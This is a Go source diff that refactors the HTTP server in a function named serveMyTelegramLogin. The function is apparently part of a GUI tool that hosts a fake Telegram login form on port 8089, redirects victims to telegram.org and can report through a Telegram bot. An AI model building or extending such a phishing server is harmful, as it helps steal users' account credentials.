@@ -1,6 +1,7 @@
 package main
 
 import (
+	"context"
 	"fmt"
 	"io/ioutil"
 	"math/rand"
@@ -10,6 +11,7 @@ import (
 	"github.com/raifpy/Go/errHandler"
 
 	"fyne.io/fyne"
+	"fyne.io/fyne/dialog"
 	"fyne.io/fyne/widget"
 )
 
@@ -23,7 +25,7 @@ func createRandomHash() string {
 	return string(b)
 
 }
-func serveMyTelegramLogin(win fyne.Window, textGrid *widget.TextGrid, textStream *string) {
+func serveMyTelegramLogin(kapat chan bool, win fyne.Window, textGrid *widget.TextGrid, textStream *string) {
 
 	serveFunc := func(response http.ResponseWriter, request *http.Request) {
 		if errHandler.HandlerBool(request.ParseForm()) {
@@ -90,7 +92,26 @@ func serveMyTelegramLogin(win fyne.Window, textGrid *widget.TextGrid, textStream
 		http.Redirect(response, request, "https://telegram.org", 301)
 		return
 	}
-	http.HandleFunc("/", serveFunc)
+	/*http.HandleFunc("/", serveFunc)
 	http.HandleFunc("/re", serveRe)
-	http.ListenAndServe(":8089", nil)
+	http.ListenAndServe(":8089", nil)*/
+
+	m := http.NewServeMux()
+	s := http.Server{Addr: ":8089", Handler: m}
+	m.HandleFunc("/", serveFunc)
+	m.HandleFunc("/re", serveRe)
+
+	go func() {
+		<-kapat
+		s.Shutdown(context.Background())
+		fmt.Println("Server Shutdown")
+
+	}()
+
+	if err := s.ListenAndServe(); errHandler.HandlerBool(err) {
+		if useTelegramBot {
+			tg.send(err.Error())
+		}
+		dialog.ShowError(err, win)
+	}
 }
